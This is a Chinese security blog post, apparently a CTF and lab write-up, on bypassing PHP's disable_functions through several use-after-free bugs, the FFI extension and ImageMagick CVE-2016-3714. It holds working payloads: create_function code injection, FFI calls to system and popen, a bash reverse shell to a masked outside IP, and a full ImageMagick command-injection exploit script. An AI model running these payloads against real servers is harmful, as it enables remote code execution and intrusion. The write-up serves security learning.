@@ -1,0 +1,591 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>Bypass Disable Functions (三) - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Bypass Disable Functions (三)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-16 17:04" pubdate>
+        August 16, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Bypass Disable Functions (三)</h1>
+            
+            <div class="markdown-body">
+              <h2 id="利用-GC-UAF"><a class="header-anchor" href="#利用-GC-UAF">🍭</a>利用 GC UAF</h2>
+<h4 id="条件"><a class="header-anchor" href="#条件">🍭</a>条件</h4>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP 版本(7.x)</li>
+</ul>
+<h4 id="原理"><a class="header-anchor" href="#原理">🍭</a>原理</h4>
+<p>此漏洞利用PHP垃圾收集器中存在三年的一个 <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72530">bug</a> ，通过PHP垃圾收集器中堆溢出来绕过 <code>disable_functions</code> 并执行系统命令。利用脚本：<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
+<h4 id="利用"><a class="header-anchor" href="#利用">🍭</a>利用</h4>
+<p>利用脚本：<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
+<p>在pwn放入执行命令：</p>
+<p><img src="/2021/08/16/ff3/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>也可修改成<code>pwn($_POST['a']);</code>较为方便。</p>
+<p>利用方法：将利用脚本exploit.php上传到目标主机有权限的目录，然后将exploit.php包含进来并使用POST方法提供你想要执行的命令即可：</p>
+<pre><code class="hljs dts">/?xxx=aW5jbHVkZSgiL3Zhci90bXAvZXhwbG9pdC5waHAiKTs=
+<span class="hljs-meta"># <span class="hljs-meta-keyword">include</span>(<span class="hljs-string">&quot;/var/tmp/exploit.php&quot;</span>);</span>
+
+<span class="hljs-symbol">POST:</span> a=ls /</code></pre>
+<p>或者利用蚁剑的插件：PHP_GC_UAF</p>
+<h2 id="Backtrace-UAF"><a class="header-anchor" href="#Backtrace-UAF">🍭</a>Backtrace UAF</h2>
+<h4 id="条件-v2"><a class="header-anchor" href="#条件-v2">🍭</a>条件</h4>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP 版本(7.x)</li>
+</ul>
+<h4 id="原理-v2"><a class="header-anchor" href="#原理-v2">🍭</a>原理</h4>
+<p>该漏洞利用在debug_backtrace()函数中使用了两年的一个 <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=76047">bug</a>。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。</p>
+<h4 id="利用-v2"><a class="header-anchor" href="#利用-v2">🍭</a>利用</h4>
+<p>利用脚本：<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p>
+<p>利用方法与上面一样</p>
+<h2 id="利用-Json-Serializer-UAF"><a class="header-anchor" href="#利用-Json-Serializer-UAF">🍭</a>利用 Json Serializer UAF</h2>
+<h4 id="条件-v3"><a class="header-anchor" href="#条件-v3">🍭</a>条件</h4>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP 版本
+<ul>
+<li>7.1 - all versions to date</li>
+<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
+<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
+</ul>
+</li>
+</ul>
+<h4 id="原理-v3"><a class="header-anchor" href="#原理-v3">🍭</a>原理</h4>
+<p>此漏洞利用json序列化程序中的释放后使用<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=77843">漏洞</a>，利用json序列化程序中的堆溢出触发，以绕过 <code>disable_functions</code> 和执行系统命令。</p>
+<h4 id="利用-v3"><a class="header-anchor" href="#利用-v3">🍭</a>利用</h4>
+<p>利用脚本：<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
+<p>利用方法和其他的UAF绕过disable_functions相同。蚁剑也有相关插件 Json Serializer UAF</p>
+<h2 id="利用-SplDoublyLinkedList-UAC"><a class="header-anchor" href="#利用-SplDoublyLinkedList-UAC">🍭</a>利用 SplDoublyLinkedList UAC</h2>
+<h4 id="条件-v4"><a class="header-anchor" href="#条件-v4">🍭</a>条件</h4>
+<ul>
+<li>PHP 版本
+<ul>
+<li>PHP v7.4.10及其之前版本</li>
+<li>PHP v8.0（Alpha）</li>
+</ul>
+</li>
+</ul>
+<h4 id="原理-v4"><a class="header-anchor" href="#原理-v4">🍭</a>原理</h4>
+<p>2020年9月20号有人在 <a target="_blank" rel="noopener" href="http://bugs.php.net">bugs.php.net</a> 上发布了一个新的 UAF <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=80111">BUG</a> ，报告人已经写出了 bypass disabled functions 的利用脚本并且私发了给官方，不过官方似乎还没有修复，原因不明。</p>
+<p>PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等。</p>
+<p>详情请看：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/251017.html">https://www.freebuf.com/articles/web/251017.html</a></p>
+<h3 id="利用方法"><a class="header-anchor" href="#利用方法">🍭</a>利用方法</h3>
+<p>利用脚本：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8355#toc-3">https://xz.aliyun.com/t/8355#toc-3</a></p>
+<p>需要执行的命令：</p>
+<p><img src="/2021/08/16/ff3/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>利用方法一致</p>
+<h2 id="利用-FFI-扩展执行命令"><a class="header-anchor" href="#利用-FFI-扩展执行命令">🍭</a>利用 FFI 扩展执行命令</h2>
+<h4 id="条件-v5"><a class="header-anchor" href="#条件-v5">🍭</a>条件</h4>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP &gt;= 7.4</li>
+<li>开启了 FFI 扩展且 <code>ffi.enable=true</code></li>
+</ul>
+<h4 id="原理-v5"><a class="header-anchor" href="#原理-v5">🍭</a>原理</h4>
+<p>PHP 7.4 的 FFI（Foreign Function Interface），即外部函数接口，允许从用户在PHP代码中去调用C代码。FFI的使用非常简单，只用声明和调用两步就可以。</p>
+<p>首先我们使用 <code>FFI::cdef()</code> 函数在PHP中声明一个我们要调用的这个C库中的函数以及使用到的数据类型：</p>
+<pre><code class="hljs elixir"><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(char* command);&quot;</span>);   <span class="hljs-comment"># 声明C语言中的system函数</span></code></pre>
+<p>返回一个新创建的FFI对象，然后使用以下方法即可调用这个对象中所声明的函数：</p>
+<pre><code class="hljs clean">$ffi -&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls / &gt; /tmp/res.txt&quot;</span>);   # 执行ls /命令并将结果写入/tmp/res.txt</code></pre>
+<p>由于system函数执行命令无回显，所以需要将执行结果写入到tmp等有权限的目录中，最后再使用 <code>echo file_get_contents(&quot;/tmp/res.txt&quot;);</code> 查看执行结果即可。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数或其他能实现我们需求的函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p>
+<h4 id="利用-v4"><a class="header-anchor" href="#利用-v4">🍭</a>利用</h4>
+<p>通过极客大挑战 2020]FighterFightsInvincibly来演示利用PHP 7.4 FFI来bypass disable_functions：</p>
+<p>源码可以看到</p>
+<p><img src="/2021/08/16/ff3/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>可以动态的执行php代码，联想到之前学的create_function代码注入：</p>
+<pre><code class="hljs autoit">create_function(<span class="hljs-built_in">string</span> $args,<span class="hljs-built_in">string</span> $code)
+//<span class="hljs-built_in">string</span> $args 声明的函数变量部分
+//<span class="hljs-built_in">string</span> $code 执行的方法代码部分</code></pre>
+<p>payload</p>
+<pre><code class="hljs routeros">/?<span class="hljs-attribute">fighter</span>=create_function&amp;fights=&amp;invincibly=;&#125;eval(<span class="hljs-variable">$_POST</span>[whoami]);/*</code></pre>
+<p>蚁剑链接无法执行命令，查看phpinfo</p>
+<p><img src="/2021/08/16/ff3/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>根据题目名字的描述，应该是让我们使用PHP 7.4 的FFI绕过disabled_function，phpinfo中也FFI处于enable状态</p>
+<h5 id="利用FFI调用C库的system函数"><a class="header-anchor" href="#利用FFI调用C库的system函数">🍭</a>利用FFI调用C库的system函数</h5>
+<p>先尝试调用C库的system函数：</p>
+<pre><code class="hljs php">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);$ffi-&gt;system(<span class="hljs-string">&quot;ls / &gt; /tmp/res.txt&quot;</span>);<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/res.txt&quot;</span>);<span class="hljs-comment">/*</span></code></pre>
+<p>C库的system函数执行没有回显，需要将执行结果写入到tmp等有权限的目录中，再使用 <code>echo file_get_contents(&quot;/tmp/res.txt&quot;);</code> 查看执行结果即可。但是这道题执行后却发现有任何结果，可能是我们没有写文件的权限。尝试反弹shell：</p>
+<pre><code class="hljs awk"><span class="hljs-regexp">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&#x27;bash -c &quot;bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">192</span>.xxx.xxx.<span class="hljs-number">72</span><span class="hljs-regexp">/2333 0&gt;&amp;1&quot;&#x27;)/</span>*</code></pre>
+<p>也不行</p>
+<h5 id="利用FFI调用C库的popen函数"><a class="header-anchor" href="#利用FFI调用C库的popen函数">🍭</a>利用FFI调用C库的popen函数</h5>
+<pre><code class="hljs stata"><span class="hljs-keyword">FILE</span> *popen(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* command, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-keyword">type</span>);</code></pre>
+<p>popen()函数会调用fork()产生子进程，然后从子进程中调用 /bin/sh -c 来执行参数 command 的指令。参数 type 可使用 “r”代表读取，”w”代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。所以可以利用C库的popen()函数来执行命令，但要读取到结果还需要C库的fgetc等函数。payload如下</p>
+<pre><code class="hljs php">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(<span class="hljs-string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="hljs-string">&quot;libc.so.6&quot;</span>);$o = $ffi-&gt;popen(<span class="hljs-string">&quot;ls /&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);$d = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">while</span>(($c = $ffi-&gt;fgetc($o)) != <span class="hljs-number">-1</span>)&#123;$d .= str_pad(strval(dechex($c)),<span class="hljs-number">2</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-number">0</span>);&#125;$ffi-&gt;pclose($o);<span class="hljs-keyword">echo</span> hex2bin($d);<span class="hljs-comment">/* </span></code></pre>
+<p>执行命令：</p>
+<p><img src="/2021/08/16/ff3/7.png" srcset="/img/loading.gif" alt="7"></p>
+<h4 id="利用FFI调用PHP源码中的函数"><a class="header-anchor" href="#利用FFI调用PHP源码中的函数">🍭</a>利用FFI调用PHP源码中的函数</h4>
+<p>FFI可以直接调用php源码中的函数，比如php_exec()函数，当他参数type为3时对应着调用的是passthru()函数，其执行命令可以直接将结果原始输出，payload如下：</p>
+<pre><code class="hljs elixir">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int php_exec(int type, char *cmd);&quot;</span>);<span class="hljs-variable">$ffi</span>-&gt;php_exec(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;/readflag&quot;</span>);<span class="hljs-regexp">/*</span></code></pre>
+<p>执行命令</p>
+<p><img src="/2021/08/16/ff3/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>就。。。。。。离谱，这个flag不完整？？</p>
+<p>用蚁剑的FFI插件</p>
+<p><img src="/2021/08/16/ff3/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>一样不完整。。。。。</p>
+<h2 id="利用-ImageMagick"><a class="header-anchor" href="#利用-ImageMagick">🍭</a>利用 ImageMagick</h2>
+<h4 id="条件-v6"><a class="header-anchor" href="#条件-v6">🍭</a>条件</h4>
+<ul>
+<li>目标主机安装了漏洞版本的imagemagick（&lt;= 3.3.0）</li>
+<li>安装了php-imagick拓展并在php.ini中启用；</li>
+<li>编写php通过new Imagick对象的方式来处理图片等格式文件；</li>
+<li>PHP &gt;= 5.4</li>
+</ul>
+<h4 id="原理-v6"><a class="header-anchor" href="#原理-v6">🍭</a>原理</h4>
+<p>imagemagick是一个用于处理图片的程序，它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。</p>
+<p>这里利用的是ImageMagick的一个漏洞（CVE-2016-3714）。只要将精心构造的图片上传至使用漏洞版本的ImageMagick，ImageMagick会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。因此很多具有头像上传、图片转换、图片编辑等具备图片上传功能的网站都可能会中招。如果在phpinfo中看到ImageMagick，就可以尝试。</p>
+<h4 id="利用-v5"><a class="header-anchor" href="#利用-v5">🍭</a>利用</h4>
+<p>利用脚本：</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . ini_get(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;
+
+$command = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? $argv[<span class="hljs-number">1</span>] : $_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>];
+<span class="hljs-keyword">if</span> ($command == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
+   $command = <span class="hljs-string">&#x27;id&#x27;</span>;
+&#125;
+
+$exploit = &lt;&lt;&lt;EOF
+push graphic-context
+viewbox <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">640</span> <span class="hljs-number">480</span>
+fill <span class="hljs-string">&#x27;url(https://example.com/image.jpg&quot;|$command&quot;)&#x27;</span>
+pop graphic-context
+EOF;
+
+file_put_contents(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, $exploit);
+$thumb = <span class="hljs-keyword">new</span> Imagick();
+$thumb-&gt;readImage(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);
+$thumb-&gt;writeImage(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+unlink(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);
+unlink(<span class="hljs-string">&quot;KKKK.png&quot;</span>);
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>参考：<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/">https://whoamianony.top/2021/03/13/Web安全/Bypass Disable_functions/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/bypass/">bypass</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/17/open/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Bypass open_basedir</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/14/ff2/">
+                        <span class="hidden-mobile">Bypass Disable Functions（二）—— Fastcgi 协议分析与 PHP-FPM 攻击方法</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
